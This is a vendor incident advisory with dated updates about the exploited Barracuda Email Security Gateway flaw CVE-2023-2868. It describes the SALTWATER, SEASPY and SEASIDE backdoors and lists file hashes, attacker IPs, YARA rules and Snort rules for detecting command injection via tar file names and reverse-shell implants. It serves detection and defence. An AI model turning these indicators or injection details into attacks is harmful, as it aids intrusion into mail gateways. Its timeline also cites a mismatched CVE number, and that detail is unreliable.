alert tcp any any -> <ESG\_IP> [25,587] (msg:"M\_Backdoor\_SEASPY\_58930"; flags:S; tcp.hdr; content:"|e6 32|"; offset:28; depth:2; byte\_test:4,>,16777216,0,big,relative; byte\_test:2,>,0,0,big,relative; threshold:type limit,track by\_src,count 1,seconds 3600; sid:1000004; rev:1;)

alert tcp any any -> <ESG\_IP> [25,587] (msg:"M\_Backdoor\_SEASPY\_60826"; flags:S; tcp.hdr; content:"|ed 9a|"; offset:28; depth:2; byte\_test:4,>,16777216,0,big,relative; threshold:type limit,track by\_src,count 1,seconds 3600; sid:1000005; rev:1;)

alert tcp any any -> <ESG\_IP> [25,587] (msg:"M\_Backdoor\_SEASPY\_60828"; flags:S; tcp.hdr; content:"|ed 9c|"; offset:28; depth:2; byte\_test:4,>,16777216,0,big,relative; byte\_test:2,>,0,0,big,relative; threshold:type limit,track by\_src,count 1,seconds 3600; sid:1000006; rev:1;)

JUNE 6th, 2023 (Updated on JUNE 15th, 2023):

Action Notice: Compromised ESG appliances must be immediately replaced regardless of patch version level. Only a subset of ESG appliances have shown any known indicators of compromise, and are identified by a message in the appliance User Interface.

If you have not replaced your appliance after receiving notice of compromise in your UI, contact Barracuda support (support@barracuda.com).

Barracuda’s ESG appliance remediation recommendation for compromised appliances continues to be replacement of the compromised ESG.

### JUNE 1st, 2023:

### Preliminary Summary of Key Findings

### Document History

| Version/Date | Notes |
| --- | --- |
| 1.0: May 30, 2023 | Initial Document |
| 1.1 : June 1, 2023 | Additional IOCs and rules included |

Barracuda Networks’ priorities throughout this incident have been transparency and to use this as an opportunity to strengthen our policies, practices, and technology to further protect against future attacks. Although our investigation is ongoing, the purpose of this document is to share preliminary findings, provide the known Indicators of Compromise (IOCs), and share YARA rules to aid our customers in their investigations, including with respect to their own environments.

Timeline

* On May 18, 2023, Barracuda was alerted to anomalous traffic originating from Barracuda Email Security Gateway (ESG) appliances.
* On May 18, 2023, Barracuda engaged Mandiant, leading global cyber security experts, to assist in the investigation.
* On May 19, 2023, Barracuda identified a vulnerability (CVE-2023-28681) in our Email Security Gateway appliance (ESG).
* On May 20, 2023, a security patch to remediate the vulnerability was applied to all ESG appliances worldwide.
* On May 21, 2023, a script was deployed to all impacted appliances to contain the incident and counter unauthorized access methods.
* A series of security patches are being deployed to all appliances in furtherance of our containment strategy.

Key Findings

While the investigation is still on-going, Barracuda has concluded the following:

* The vulnerability existed in a module which initially screens the attachments of incoming emails. No other Barracuda products, including our SaaS email security services, were subject to the vulnerability identified.
* Earliest identified evidence of exploitation of CVE-2023-2868 is currently October 2022.
* Barracuda identified that CVE-2023-2868 was utilized to obtain unauthorized access to a subset of ESG appliances.
* Malware was identified on a subset of appliances allowing for persistent backdoor access.
* Evidence of data exfiltration was identified on a subset of impacted appliances..

Users whose appliances we believe were impacted have been notified via the ESG user interface of actions to take. Barracuda has also reached out to these specific customers. Additional customers may be identified in the course of the investigation.

CVE-2023-2868

On May 19, 2023, Barracuda Networks identified a remote command injection vulnerability (CVE-2023-2868) present in the Barracuda Email Security Gateway (appliance form factor only) versions 5.1.3.001-9.2.0.006. The vulnerability stemmed from incomplete input validation of user supplied .tar files as it pertains to the names of the files contained within the archive. Consequently, a remote attacker could format file names in a particular manner that would result in remotely executing a system command through Perl's qx operator with the privileges of the Email Security Gateway product.

Barracuda's investigation to date has determined that a third party utilized the technique described above to gain unauthorized access to a subset of ESG appliances.

Malware

This section details the malware that has been identified to date, and to assist in tracking, codenames for the malware have been assigned.

SALTWATER

SALTWATER is a trojanized module for the Barracuda SMTP daemon (bsmtpd) that contains backdoor functionality. The capabilities of SALTWATER include the ability to upload or download arbitrary files, execute commands, as well as proxy and tunneling capabilities.

Identified at path: /home/product/code/firmware/current/lib/smtp/modules on a subset of ESG appliances.

The backdoor is implemented using hooks on the send, recv, close syscalls and amounts to five components, most of which are referred to as “Channels” within the binary. In addition to providing proxying capabilities, these components exhibit backdoor functionality.  The five (5) channels can be seen in the list below.

* DownloadChannel
* UploadChannel
* ProxyChannel
* ShellChannel
* TunnelArgs

Mandiant is still analyzing SALTWATER to determine if it overlaps with any other known malware families.

Table 1 below provides the file metadata related to a SALTWATER variant.

| Name | SHA256 |
| --- | --- |
| mod\_udp.so | 1c6cad0ed66cf8fd438974e1eac0bc6dd9119f84892930cb71cb56a5e985f0a4 |

| MD5 | File Type | Size (Bytes) |
| --- | --- | --- |
| 827d507aa3bde0ef903ca5dec60cdec8 | ELF x86 | 1,879,643 |

Table 1: SALTWATER variant metadata

SEASPY

SEASPY is an x64 ELF persistence backdoor that poses as a legitimate Barracuda Networks service and establishes itself as a PCAP filter, specifically monitoring traffic on port 25 (SMTP) and port 587. SEASPY contains backdoor functionality that is activated by a "magic packet".

Identified at path: /sbin/ on a subset of ESG appliances.

Mandiant analysis has identified code overlap between SEASPY and cd00r, a publicly available backdoor.

Table 2 below provides the file metadata related to a SEASPY variant.

| Name | SHA256 |
| --- | --- |
| BarracudaMailService | 3f26a13f023ad0dcd7f2aa4e7771bba74910ee227b4b36ff72edc5f07336f115 |

| MD5 | File Type | Size (Bytes) |
| --- | --- | --- |
| 4ca4f582418b2cc0626700511a6315c0 | ELF x64 | 2,924,217 |

Table 2: SEASPY variant metadata

SEASIDE

SEASIDE is a Lua based module for the Barracuda SMTP daemon (bsmtpd) that monitors SMTP HELO/EHLO commands to receive a command and control (C2) IP address and port which it passes as arguments to an external binary that establishes a reverse shell.

Table 3 below provides the file metadata related to a SEASIDE.

| Name | SHA256 |
| --- | --- |
| mod\_require\_helo.lua | fa8996766ae347ddcbbd1818fe3a878272653601a347d76ea3d5dfc227cd0bc8 |

| MD5 | File Type | Size (Bytes) |
| --- | --- | --- |
| cd2813f0260d63ad5adf0446253c2172 | Lua module | 2,724 |

Table 3: SEASIDE metadata

Recommendations For Impacted Customers

1. Ensure your ESG appliance is receiving and applying updates, definitions, and security patches from Barracuda. Contact Barracuda support (support@barracuda.com) to validate if the appliance is up to date.
2. Discontinue the use of the compromised ESG appliance and contact Barracuda support (support@barracuda.com) to obtain a new ESG virtual or hardware appliance.
3. Rotate any applicable credentials connected to the ESG appliance:

   o  Any connected LDAP/AD

   o  Barracuda Cloud Control

   o  FTP Server

   o  SMB

   o  Any private TLS certificates
4. Review your network logs for any of the IOCs listed below and any unknown IPs. Contact compliance@barracuda.com if any are identified.

To support customers in the investigations of their environments, we are providing a list of all endpoint and network indicators observed over the course of the investigation to date. We have also developed a series of YARA rules that can be found in the section below.

Endpoint IOCs

Table 4 lists the endpoint IOCs, including malware and utilities, attributed to attacker activity during the investigation.

|  | File Name | MD5 Hash | Type |
| --- | --- | --- | --- |
| 1 | appcheck.sh | N/A | Bash script |
| 2 | aacore.sh | N/A | Bash script |
| 3 | 1.sh | N/A | Bash script |
| 4 | mod\_udp.so | 827d507aa3bde0ef903ca5dec60cdec8 | SALTWATER Variant |
| 5 | intent | N/A | N/A |
| 6 | install\_helo.tar | 2ccb9759800154de817bf779a52d48f8 | TAR Package |
| 7 | intent\_helo | f5ab04a920302931a8bd063f27b745cc | Bash script |
| 8 | pd | 177add288b289d43236d2dba33e65956 | Reverse Shell |
| 9 | update\_v31.sh | 881b7846f8384c12c7481b23011d8e45 | Bash script |
| 10 | mod\_require\_helo.lua | cd2813f0260d63ad5adf0446253c2172 | SEASIDE |
| 11 | BarracudaMailService | 82eaf69de710abdc5dea7cd5cb56cf04 | SEASPY |
| 12 | BarracudaMailService | e80a85250263d58cc1a1dc39d6cf3942 | SEASPY |
| 13 | BarracudaMailService | 5d6cba7909980a7b424b133fbac634ac | SEASPY |
| 14 | BarracudaMailService | 1bbb32610599d70397adfdaf56109ff3 | SEASPY |
| 15 | BarracudaMailService | 4b511567cfa8dbaa32e11baf3268f074 | SEASPY |
| 16 | BarracudaMailService | a08a99e5224e1baf569fda816c991045 | SEASPY |
| 17 | BarracudaMailService | 19ebfe05040a8508467f9415c8378f32 | SEASPY |
| 18 | mod\_udp.so | 1fea55b7c9d13d822a64b2370d015da7 | SALTWATER Variant |
| 19 | mod\_udp.so | 64c690f175a2d2fe38d3d7c0d0ddbb6e | SALTWATER Variant |
| 20 | mod\_udp.so | 4cd0f3219e98ac2e9021b06af70ed643 | SALTWATER Variant |

Table 4: Endpoint IOCs

Network IOCs

Table 5 lists the network IOCs, including IP addresses and domain names, attributed to attacker activity during the investigation.

|  | Indicator | ASN | Location |
| --- | --- | --- | --- |
| 1 | xxl17z.dnslog.cn | N/A | N/A |
| 2 | mx01.bestfindthetruth.com | N/A | N/A |
| 3 | 64.176.7.59 | AS-CHOOPA | US |
| 4 | 64.176.4.234 | AS-CHOOPA | US |
| 5 | 52.23.241.105 | AMAZON-AES | US |
| 6 | 23.224.42.5 | CloudRadium L.L.C | US |
| 7 | 192.74.254.229 | PEG TECH INC | US |
| 8 | 192.74.226.142 | PEG TECH INC | US |
| 9 | 155.94.160.72 | QuadraNet Enterprises LLC | US |
| 10 | 139.84.227.9 | AS-CHOOPA | US |
| 11 | 137.175.60.253 | PEG TECH INC | US |
| 12 | 137.175.53.170 | PEG TECH INC | US |
| 13 | 137.175.51.147 | PEG TECH INC | US |
| 14 | 137.175.30.36 | PEG TECH INC | US |
| 15 | 137.175.28.251 | PEG TECH INC | US |
| 16 | 137.175.19.25 | PEG TECH INC | US |
| 17 | 107.148.219.227 | PEG TECH INC | US |
| 18 | 107.148.219.55 | PEG TECH INC | US |
| 19 | 107.148.219.54 | PEG TECH INC | US |
| 20 | 107.148.219.53 | PEG TECH INC | US |
| 21 | 107.148.219.227 | PEG TECH INC | US |
| 22 | 107.148.149.156 | PEG TECH INC | US |
| 23 | 104.223.20.222 | QuadraNet Enterprises LLC | US |
| 24 | 103.93.78.142 | EDGENAP LTD | JP |
| 25 | 103.27.108.62 | TOPWAY GLOBAL LIMITED | HK |
| 26 | 137.175.30.86 | PEGTECHINC | US |
| 27 | 199.247.23.80 | AS-CHOOPA | DE |
| 28 | 38.54.1.82 | KAOPU CLOUD HK LIMITED | SG |
| 29 | 107.148.223.196 | PEGTECHINC | US |
| 30 | 23.224.42.29 | CNSERVERS | US |
| 31 | 137.175.53.17 | PEGTECHINC | US |
| 32 | 103.146.179.101 | GIGABITBANK GLOBAL | HK |

Table 5: Network IOCs

YARA Rules

CVE-2023-2868

The following three (3) YARA rules can be used to hunt for the malicious TAR file which exploits CVE-2023-2868**:**

rule M\_Hunting\_Exploit\_Archive\_2

 {

     meta:

         description = "Looks for TAR archive with /tmp/ base64 encoded being part of filename of enclosed files"

         date\_created = "2023-05-26"

         date\_modified = "2023-05-26"

         md5 = "0d67f50a0bf7a3a017784146ac41ada0"

         version = "1.0"

     strings:

         $ustar = { 75 73 74 61 72 }

         $b64\_tmp = "/tmp/" base64

     condition:

         filesize < 1MB and

$ustar at 257 and

for any i in (0 .. #ustar) : (

$b64\_tmp in (i \* 512 .. i \* 512 + 250)

)

 }

rule M\_Hunting\_Exploit\_Archive\_3

 {

     meta:

         description = "Looks for TAR archive with openssl base64 encoded being part of filename of enclosed files"

         date\_created = "2023-05-26"

         date\_modified = "2023-05-26"

         md5 = "0d67f50a0bf7a3a017784146ac41ada0"

         version = "1.0"

     strings:

         $ustar = { 75 73 74 61 72 }

         $b64\_openssl = "openssl" base64

     condition:

filesize < 1MB and

         $ustar at 257 and

for any i in (0 .. #ustar) : (

$b64\_openssl in (i \* 512 .. i \* 512 + 250)

)

 }

rule M\_Hunting\_Exploit\_Archive\_CVE\_2023\_2868

 {

     meta:

         description = "Looks for TAR archive with single quote/backtick as start of filename of enclosed files. CVE-2023-2868"

         date\_created = "2023-05-26"

         date\_modified = "2023-05-26"

         md5 = "0d67f50a0bf7a3a017784146ac41ada0"

         version = "1.0"

     strings:

         $ustar = { 75 73 74 61 72 }

         $qb = "'`"

     condition:

filesize < 1MB and

         $ustar at 257 and

for any i in (0 .. #ustar) : (

$qb at (@ustar[i] + 255)

)

 }

SALTWATER

The following three (3) YARA rule can be used to hunt for **SALTWATER:**

rule M\_Hunting\_Linux\_Funchook

 {

     strings:

         $f = "funchook\_"

         $s1 = "Enter funchook\_create()"

         $s2 = "Leave funchook\_create() => %p"

         $s3 = "Enter funchook\_prepare(%p, %p, %p)"

         $s4 = "Leave funchook\_prepare(..., [%p->%p],...) => %d"

         $s5 = "Enter funchook\_install(%p, 0x%x)"

         $s6 = "Leave funchook\_install() => %d"

         $s7 = "Enter funchook\_uninstall(%p, 0x%x)"

         $s8 = "Leave funchook\_uninstall() => %d"

         $s9 = "Enter funchook\_destroy(%p)"

         $s10 = "Leave funchook\_destroy() => %d"

         $s11 = "Could not modify already-installed funchook handle."

         $s12 = "  change %s address from %p to %p"

         $s13 = "  link\_map addr=%p, name=%s"

         $s14 = "  ELF type is neither ET\_EXEC nor ET\_DYN."

         $s15 = "  not a valid ELF module %s."

         $s16 = "Failed to protect memory %p (size=%"

         $s17 = "  protect memory %p (size=%"

         $s18 = "Failed to unprotect memory %p (size=%"

         $s19 = "  unprotect memory %p (size=%"

         $s20 = "Failed to unprotect page %p (size=%"

         $s21 = "  unprotect page %p (size=%"

         $s22 = "Failed to protect page %p (size=%"

         $s23 = "  protect page %p (size=%"

         $s24 = "Failed to deallocate page %p (size=%"

         $s25 = " deallocate page %p (size=%"

         $s26 = "  allocate page %p (size=%"

         $s27 = "  try to allocate %p but %p (size=%"

         $s28 = "  allocate page %p (size=%"

         $s29 = "Could not find a free region near %p"

         $s30 = "  -- Use address %p or %p for function %p"

     condition:

         filesize < 15MB and uint32(0) == 0x464c457f and (#f > 5 or 4 of ($s\*))

 }

rule M\_Hunting\_Linux\_SALTWATER\_1

 {

     strings:

         $s1 = { 71 75 69 74 0D 0A 00 00 00 33 8C 25 3D 9C 17 70 08 F9 0C 1A 41 71 55 36 1A 5C 4B 8D 29 7E 0D 78 }

         $s2 = { 00 8B D5 AD 93 B7 54 D5 00 33 8C 25 3D 9C 17 70 08 F9 0C 1A 41 71 55 36 1A 5C 4B 8D 29 7E 0D 78 }

     condition:

         filesize < 15MB and uint32(0) == 0x464c457f and any of them

 }

rule M\_Hunting\_Linux\_SALTWATER\_2

 {

     strings:

         $c1 = "TunnelArgs"

         $c2 = "DownloadChannel"

         $c3 = "UploadChannel"

         $c4 = "ProxyChannel"

         $c5 = "ShellChannel"

         $c6 = "MyWriteAll"

         $c7 = "MyReadAll"

         $c8 = "Connected2Vps"

         $c9 = "CheckRemoteIp"

         $c10 = "GetFileSize"

         $s1 = "[-] error: popen failed"

         $s2 = "/home/product/code/config/ssl\_engine\_cert.pem"

         $s3 = "libbindshell.so"

     condition:

         filesize < 15MB and uint32(0) == 0x464c457f and (2 of ($s\*) or 4 of ($c\*))

 }

The following SNORT rule can be used to hunt for **SEASPY** magic packets**:**

alert tcp any any -> any [25,587] (msg:"M\_Backdoor\_SEASPY"; flags:S; dsize:>9; content:"oXmp"; offset:0; depth:4; threshold:type limit,track by\_src,count 1,seconds 3600; sid:1000000; rev:1;)

The following SNORT rules require Suricata 5.0.4 or newer and can be used to hunt for **SEASPY** magic packets:

alert tcp any any -> any [25,587] (msg:"M\_Backdoor\_SEASPY\_1358"; flags:S; tcp.hdr; content:"|05 4e|"; offset:22; depth:2; threshold:type limit,track by\_src,count 1,seconds 3600; sid:1000001; rev:1;)

alert tcp any any -> any [25,587] (msg:"M\_Backdoor\_SEASPY\_58928"; flags:S; tcp.hdr; content:"|e6 30|"; offset:28; depth:2; byte\_test:4,>,16777216,0,big,relative; threshold:type limit,track by\_src,count 1,seconds 3600; sid:1000002; rev:1;)

alert tcp any any -> any [25,587] (msg:"M\_Backdoor\_SEASPY\_58930"; flags:S; tcp.hdr; content:"|e6 32|"; offset:28; depth:2; byte\_test:4,>,16777216,0,big,relative; byte\_test:2,>,0,0,big,relative; threshold:type limit,track by\_src,count 1,seconds 3600; sid:1000003; rev:1;)

### MAY 30th, 2023:

### **Preliminary Summary of Key Findings**

Barracuda Networks priorities throughout this incident have been transparency and to use this as an opportunity to strengthen our policies, practices, and technology to further protect against future attacks. Although our investigation is ongoing, the purpose of this document is to share preliminary findings, provide the known Indicators of Compromise (IOCs), and share YARA rules to aid our customers in their investigations, including with respect to their own environments.

Timeline

* On May 18, 2023, Barracuda was alerted to anomalous traffic originating from Barracuda Email Security Gateway (ESG) appliances.
* On May 18, 2023, Barracuda engaged Mandiant, leading global cyber security experts, to assist in the investigation.
* On May 19, 2023, Barracuda identified a vulnerability (CVE-2023-28681) in our Email Security Gateway appliance (ESG).
* On May 20, 2023, a security patch to remediate the vulnerability was applied to all ESG appliances worldwide.
* On May 21, 2023, a script was deployed to all impacted appliances to contain the incident and counter unauthorized access methods.
* A series of security patches are being deployed to all appliances in furtherance of our containment strategy.

Key Findings

While the investigation is still on-going, Barracuda has concluded the following:

* The vulnerability existed in a module which initially screens the attachments of incoming emails. No other Barracuda products, including our SaaS email security services, were subject to the vulnerability identified.
* Earliest identified evidence of exploitation of CVE-2023-2868 is currently October 2022.
* Barracuda identified that CVE-2023-2868 was utilized to obtain unauthorized access to a subset of ESG appliances.
* Malware was identified on a subset of appliances allowing for persistent backdoor access.
* Evidence of data exfiltration was identified on a subset of impacted appliances.

Users whose appliances we believe were impacted have been notified via the ESG user interface of actions to take. Barracuda has also reached out to these specific customers. Additional customers may be identified in the course of the investigation.

CVE-2023-2868

On May 19, 2023, Barracuda Networks identified a remote command injection vulnerability (CVE-2023-2868) present in the Barracuda Email Security Gateway (appliance form factor only) versions 5.1.3.001-9.2.0.006. The vulnerability stemmed from incomplete input validation of user supplied .tar files as it pertains to the names of the files contained within the archive. Consequently, a remote attacker could format file names in a particular manner that would result in remotely executing a system command through Perl's qx operator with the privileges of the Email Security Gateway product.

Barracuda's investigation to date has determined that a third party utilized the technique described above to gain unauthorized access to a subset of ESG appliances.

Malware

This section details the malware that has been identified to date.

SALTWATER

SALTWATER is a trojanized module for the Barracuda SMTP daemon (bsmtpd) that contains backdoor functionality. The capabilities of SALTWATER include the ability to upload or download arbitrary files, execute commands, as well as proxy and tunneling capabilities.

Identified at path: /home/product/code/firmware/current/lib/smtp/modules on a subset of ESG appliances.

The backdoor is implemented using hooks on the send, recv, close syscalls and amounts to five components, most of which are referred to as “Channels” within the binary. In addition to providing backdoor and proxying capabilities, these components exhibit classic backdoor functionality.  The five (5) channels can be seen in the list below.

* DownloadChannel
* UploadChannel
* ProxyChannel
* ShellChannel
* TunnelArgs

Mandiant is still analyzing SALTWATER to determine if it overlaps with any other known malware families. Table 1 below provides the file metadata related to a SALTWATER variant.

Table 1 below provides the file metadata related to a SALTWATER variant.

| Name | SHA256 |
| --- | --- |
| mod\_udp.so | 1c6cad0ed66cf8fd438974e1eac0bc6dd9119f84892930cb71cb56a5e985f0a4 |

| MD5 | File Type | Size (Bytes) |
| --- | --- | --- |
| 827d507aa3bde0ef903ca5dec60cdec8 | ELF x86 | 1,879,643 |

Table 1: SALTWATER variant metadata

SEASPY

SEASPY is an x64 ELF persistence backdoor that poses as a legitimate Barracuda Networks service and establishes itself as a PCAP filter, specifically monitoring traffic on port 25 (SMTP). SEASPY also contains backdoor functionality that is activated by a "magic packet".

Identified at path: /sbin/ on a subset of ESG appliances.

Mandiant analysis has identified code overlap between SEASPY and cd00r, a publicly available backdoor.

Table 2 below provides the file metadata related to a SEASPY variant.

| Name | SHA256 |
| --- | --- |
| BarracudaMailService | 3f26a13f023ad0dcd7f2aa4e7771bba74910ee227b4b36ff72edc5f07336f115 |

| MD5 | File Type | Size (Bytes) |
| --- | --- | --- |
| 4ca4f582418b2cc0626700511a6315c0 | ELF x64 | 2,924,217 |

Table 2: SEASPY variant metadata

SEASIDE

SEASIDE is a Lua based module for the Barracuda SMTP daemon (bsmtpd) that monitors SMTP HELO/EHLO commands to receive a command and control (C2) IP address and port which it passes as arguments to an external binary that establishes a reverse shell.

Table 3 below provides the file metadata related to a SEASIDE.

| Name | SHA256 |
| --- | --- |
| mod\_require\_helo.lua | fa8996766ae347ddcbbd1818fe3a878272653601a347d76ea3d5dfc227cd0bc8 |

| MD5 | File Type | Size (Bytes) |
| --- | --- | --- |
| cd2813f0260d63ad5adf0446253c2172 | Lua module | 2,724 |

Table 3: SEASIDE metadata

Recommendations For Impacted Customers

1. Ensure your ESG appliance is receiving and applying updates, definitions, and security patches from Barracuda. Contact Barracuda support (support@barracuda.com) to validate if the appliance is up to date.
2. Discontinue the use of the compromised ESG appliance and contact Barracuda support (support@barracuda.com) to obtain a new ESG virtual or hardware appliance.
3. Rotate any applicable credentials connected to the ESG appliance:

   o  Any connected LDAP/AD

   o  Barracuda Cloud Control

   o  FTP Server

   o  SMB

   o  Any private TLS certificates
4. Review your network logs for any of the IOCs listed below and any unknown IPs. Contact compliance@barracuda.com if any are identified.

To support customers in the investigations of their environments, we are providing a list of all endpoint and network indicators observed over the course of the investigation to date. We have also developed a series of YARA rules that can be found in the section below.

Endpoint IOCs

Table 4 lists the endpoint IOCs, including malware and utilities, attributed to attacker activity during the investigation.

|  | File Name | MD5 Hash | Type |
| --- | --- | --- | --- |
| 1 | appcheck.sh | N/A | Bash script |
| 2 | aacore.sh | N/A | Bash script |
| 3 | 1.sh | N/A | Bash script |
| 4 | mod\_udp.so | 827d507aa3bde0ef903ca5dec60cdec8 | SALTWATER Variant |
| 5 | intent | N/A | N/A |
| 6 | install\_helo.tar | 2ccb9759800154de817bf779a52d48f8 | TAR Package |
| 7 | intent\_helo | f5ab04a920302931a8bd063f27b745cc | Bash script |
| 8 | pd | 177add288b289d43236d2dba33e65956 | Reverse Shell |
| 9 | update\_v31.sh | 881b7846f8384c12c7481b23011d8e45 | Bash script |
| 10 | mod\_require\_helo.lua | cd2813f0260d63ad5adf0446253c2172 | SEASIDE |
| 11 | BarracudaMailService | 82eaf69de710abdc5dea7cd5cb56cf04 | SEASPY |
| 12 | BarracudaMailService | e80a85250263d58cc1a1dc39d6cf3942 | SEASPY |
| 13 | BarracudaMailService | 5d6cba7909980a7b424b133fbac634ac | SEASPY |
| 14 | BarracudaMailService | 1bbb32610599d70397adfdaf56109ff3 | SEASPY |
| 15 | BarracudaMailService | 4b511567cfa8dbaa32e11baf3268f074 | SEASPY |
| 16 | BarracudaMailService | a08a99e5224e1baf569fda816c991045 | SEASPY |
| 17 | BarracudaMailService | 19ebfe05040a8508467f9415c8378f32 | SEASPY |
| 18 | mod\_udp.so | 1fea55b7c9d13d822a64b2370d015da7 | SALTWATER Variant |
| 19 | mod\_udp.so | 64c690f175a2d2fe38d3d7c0d0ddbb6e | SALTWATER Variant |
| 20 | mod\_udp.so | 4cd0f3219e98ac2e9021b06af70ed643 | SALTWATER Variant |

Table 4: Endpoint IOCs

Network IOCs

Table 5 lists the network IOCs, including IP addresses and domain names, attributed to attacker activity during the investigation.

|  | Indicator | ASN | Location |
| --- | --- | --- | --- |
| 1 | xxl17z.dnslog.cn | N/A | N/A |
| 2 | mx01.bestfindthetruth.com | N/A | N/A |
| 3 | 64.176.7.59 | AS-CHOOPA | US |
| 4 | 64.176.4.234 | AS-CHOOPA | US |
| 5 | 52.23.241.105 | AMAZON-AES | US |
| 6 | 23.224.42.5 | CloudRadium L.L.C | US |
| 7 | 192.74.254.229 | PEG TECH INC | US |
| 8 | 192.74.226.142 | PEG TECH INC | US |
| 9 | 155.94.160.72 | QuadraNet Enterprises LLC | US |
| 10 | 139.84.227.9 | AS-CHOOPA | US |
| 11 | 137.175.60.253 | PEG TECH INC | US |
| 12 | 137.175.53.170 | PEG TECH INC | US |
| 13 | 137.175.51.147 | PEG TECH INC | US |
| 14 | 137.175.30.36 | PEG TECH INC | US |
| 15 | 137.175.28.251 | PEG TECH INC | US |
| 16 | 137.175.19.25 | PEG TECH INC | US |
| 17 | 107.148.219.227 | PEG TECH INC | US |
| 18 | 107.148.219.55 | PEG TECH INC | US |
| 19 | 107.148.219.54 | PEG TECH INC | US |
| 20 | 107.148.219.53 | PEG TECH INC | US |
| 21 | 107.148.219.227 | PEG TECH INC | US |
| 22 | 107.148.149.156 | PEG TECH INC | US |
| 23 | 104.223.20.222 | QuadraNet Enterprises LLC | US |
| 24 | 103.93.78.142 | EDGENAP LTD | JP |
| 25 | 103.27.108.62 | TOPWAY GLOBAL LIMITED | HK |

Table 5: Network IOCs

YARA Rules

CVE-2023-2868

The following three (3) YARA rules can be used to hunt for the malicious TAR file which exploits CVE-2023-2868**:**

rule M\_Hunting\_Exploit\_Archive\_2

 {

     meta:

         description = "Looks for TAR archive with /tmp/ base64 encoded being part of filename of enclosed files"

         date\_created = "2023-05-26"

         date\_modified = "2023-05-26"

         md5 = "0d67f50a0bf7a3a017784146ac41ada0"

         version = "1.0"

     strings:

         $ustar = { 75 73 74 61 72 }

         $b64\_tmp = "/tmp/" base64

     condition:

         filesize < 1MB and

$ustar at 257 and

for any i in (0 .. #ustar) : (

$b64\_tmp in (i \* 512 .. i \* 512 + 250)

)

 }

rule M\_Hunting\_Exploit\_Archive\_3

 {

     meta:

         description = "Looks for TAR archive with openssl base64 encoded being part of filename of enclosed files"

         date\_created = "2023-05-26"

         date\_modified = "2023-05-26"

         md5 = "0d67f50a0bf7a3a017784146ac41ada0"

         version = "1.0"

     strings:

         $ustar = { 75 73 74 61 72 }

         $b64\_openssl = "openssl" base64

     condition:

filesize < 1MB and

         $ustar at 257 and

for any i in (0 .. #ustar) : (

$b64\_openssl in (i \* 512 .. i \* 512 + 250)

)

 }

rule M\_Hunting\_Exploit\_Archive\_CVE\_2023\_2868

 {

     meta:

         description = "Looks for TAR archive with single quote/backtick as start of filename of enclosed files. CVE-2023-2868"

         date\_created = "2023-05-26"

         date\_modified = "2023-05-26"

         md5 = "0d67f50a0bf7a3a017784146ac41ada0"

         version = "1.0"

     strings:

         $ustar = { 75 73 74 61 72 }

         $qb = "'`"

     condition:

filesize < 1MB and

         $ustar at 257 and

for any i in (0 .. #ustar) : (

$qb at (@ustar[i] + 255)

)

 }

SALTWATER

The following three (3) YARA rule can be used to hunt for **SALTWATER:**

rule M\_Hunting\_Linux\_Funchook

 {

     strings:

         $f = "funchook\_"

         $s1 = "Enter funchook\_create()"

         $s2 = "Leave funchook\_create() => %p"

         $s3 = "Enter funchook\_prepare(%p, %p, %p)"

         $s4 = "Leave funchook\_prepare(..., [%p->%p],...) => %d"

         $s5 = "Enter funchook\_install(%p, 0x%x)"

         $s6 = "Leave funchook\_install() => %d"

         $s7 = "Enter funchook\_uninstall(%p, 0x%x)"

         $s8 = "Leave funchook\_uninstall() => %d"

         $s9 = "Enter funchook\_destroy(%p)"

         $s10 = "Leave funchook\_destroy() => %d"

         $s11 = "Could not modify already-installed funchook handle."

         $s12 = "  change %s address from %p to %p"

         $s13 = "  link\_map addr=%p, name=%s"

         $s14 = "  ELF type is neither ET\_EXEC nor ET\_DYN."

         $s15 = "  not a valid ELF module %s."

         $s16 = "Failed to protect memory %p (size=%"

         $s17 = "  protect memory %p (size=%"

         $s18 = "Failed to unprotect memory %p (size=%"

         $s19 = "  unprotect memory %p (size=%"

         $s20 = "Failed to unprotect page %p (size=%"

         $s21 = "  unprotect page %p (size=%"

         $s22 = "Failed to protect page %p (size=%"

         $s23 = "  protect page %p (size=%"

         $s24 = "Failed to deallocate page %p (size=%"

         $s25 = " deallocate page %p (size=%"

         $s26 = "  allocate page %p (size=%"

         $s27 = "  try to allocate %p but %p (size=%"

         $s28 = "  allocate page %p (size=%"

         $s29 = "Could not find a free region near %p"

         $s30 = "  -- Use address %p or %p for function %p"

     condition:

         filesize < 15MB and uint32(0) == 0x464c457f and (#f > 5 or 4 of ($s\*))

 }

rule M\_Hunting\_Linux\_SALTWATER\_1

 {

     strings:

         $s1 = { 71 75 69 74 0D 0A 00 00 00 33 8C 25 3D 9C 17 70 08 F9 0C 1A 41 71 55 36 1A 5C 4B 8D 29 7E 0D 78 }

         $s2 = { 00 8B D5 AD 93 B7 54 D5 00 33 8C 25 3D 9C 17 70 08 F9 0C 1A 41 71 55 36 1A 5C 4B 8D 29 7E 0D 78 }

     condition:

         filesize < 15MB and uint32(0) == 0x464c457f and any of them

 }

rule M\_Hunting\_Linux\_SALTWATER\_2

 {

     strings:

         $c1 = "TunnelArgs"

         $c2 = "DownloadChannel"

         $c3 = "UploadChannel"

         $c4 = "ProxyChannel"

         $c5 = "ShellChannel"

         $c6 = "MyWriteAll"

         $c7 = "MyReadAll"

         $c8 = "Connected2Vps"

         $c9 = "CheckRemoteIp"

         $c10 = "GetFileSize"

         $s1 = "[-] error: popen failed"

         $s2 = "/home/product/code/config/ssl\_engine\_cert.pem"

         $s3 = "libbindshell.so"

     condition:

         filesize < 15MB and uint32(0) == 0x464c457f and (2 of ($s\*) or 4 of ($c\*))

 }

### MAY 23rd, 2023:

Barracuda identified a vulnerability ([CVE-2023-2868](https://nvd.nist.gov/vuln/detail/CVE-2023-2868)) in our Email Security Gateway appliance (ESG) on May 19, 2023. A security patch to eliminate the vulnerability was applied to all ESG appliances worldwide on Saturday, May 20, 2023. The vulnerability existed in a module which initially screens the attachments of incoming emails. No other Barracuda products, including our SaaS email security services, were subject to this vulnerability.

We took immediate steps to investigate this vulnerability. Based on our investigation to date, we’ve identified that the vulnerability resulted in unauthorized access to a subset of email gateway appliances. As part of our containment strategy, all ESG appliances have received a second patch on May 21, 2023. Users whose appliances we believe were impacted have been notified via the ESG user interface of actions to take. Barracuda has also reached out to these specific customers.

We will continue actively monitoring this situation, and we will be transparent in sharing details on what actions we are taking. Information gathering is ongoing as part of the investigation. We want to ensure we only share validated information with actionable steps for you to take. As we have information to share, we will provide updates via this product status page ([https://status.barracuda.com](https://status.barracuda.com/)) and direct outreach to impacted customers. Updates are also located on Barracuda’s Trust Center (<https://www.barracuda.com/company/legal>).

